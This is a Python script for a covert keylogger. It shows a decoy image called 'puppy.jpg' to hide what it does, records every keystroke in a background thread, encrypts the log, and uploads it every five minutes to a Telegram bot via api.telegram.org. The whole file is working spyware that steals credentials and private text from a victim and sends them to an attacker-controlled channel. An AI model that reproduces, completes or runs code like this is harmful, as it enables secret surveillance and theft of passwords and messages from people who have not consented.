import os
import threading
import base64
from cryptography.fernet import Fernet
from pynput import keyboard
import requests
import subprocess
import time
import sys
from PIL import Image

# --- Configuration ---
LOG_FILE = "keylogs.txt"
ENCRYPTED_LOG_FILE = "keylogs.enc"
KEY_FILE = "encryption.key"
TELEGRAM_BOT_TOKEN = os.environ.get("BOT_TOKEN")
TELEGRAM_CHAT_ID = os.environ.get("YOUR_CHAT_ID")
IMAGE_FILE = "puppy.jpg"  # Replace with your image file

# --- Encryption Setup ---
def generate_key():
    if not os.path.exists(KEY_FILE):
        key = Fernet.generate_key()
        with open(KEY_FILE, "wb") as keyfile:
            keyfile.write(key)

def load_key():
    with open(KEY_FILE, "rb") as keyfile:
        return keyfile.read()

def encrypt_file():
    key = load_key()
    fernet = Fernet(key)
    
    with open(LOG_FILE, "rb") as file:
        data = file.read()
    encrypted_data = fernet.encrypt(data)
    
    with open(ENCRYPTED_LOG_FILE, "wb") as enc_file:
        enc_file.write(encrypted_data)

def decrypt_file():
    key = load_key()
    fernet = Fernet(key)
    
    with open(ENCRYPTED_LOG_FILE, "rb") as enc_file:
        encrypted_data = enc_file.read()
    decrypted_data = fernet.decrypt(encrypted_data)
    return decrypted_data

# --- Keystroke Logger ---
def log_key(key):
    try:
        with open(LOG_FILE, "a") as logfile:
            logfile.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., space, enter)
        with open(LOG_FILE, "a") as logfile:
            logfile.write(f"[{key}]")

# Listener thread
def start_keylogger():
    with keyboard.Listener(on_press=log_key) as listener:
        listener.join()

# --- Communication with Telegram ---
def send_logs_to_telegram():
    encrypt_file()
    with open(ENCRYPTED_LOG_FILE, "rb") as enc_file:
        encrypted_logs = enc_file.read()
        
        # Send to Telegram
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        files = {"document": ("keylogs.enc", encrypted_logs)}
        data = {"chat_id": TELEGRAM_CHAT_ID, "caption": "Encrypted Keylogs"}
        
        response = requests.post(url, files=files, data=data)
        if response.status_code == 200:
            print("Logs sent successfully!")
        else:
            print(f"Failed to send logs: {response.text}")

# --- Display Image ---
def display_image():
    try:
        img = Image.open(IMAGE_FILE)
        img.show()
    except Exception as e:
        print(f"Failed to display image: {e}")

# --- Background Process ---
def background_process():
    # Display the image
    display_image()

    # Start keylogger in a separate thread
    keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
    keylogger_thread.start()

    # Periodically send logs
    while True:
        send_logs_to_telegram()
        time.sleep(300)  # Every 5 minutes

if __name__ == "__main__":
    generate_key()  # Ensure encryption key exists
    background_process()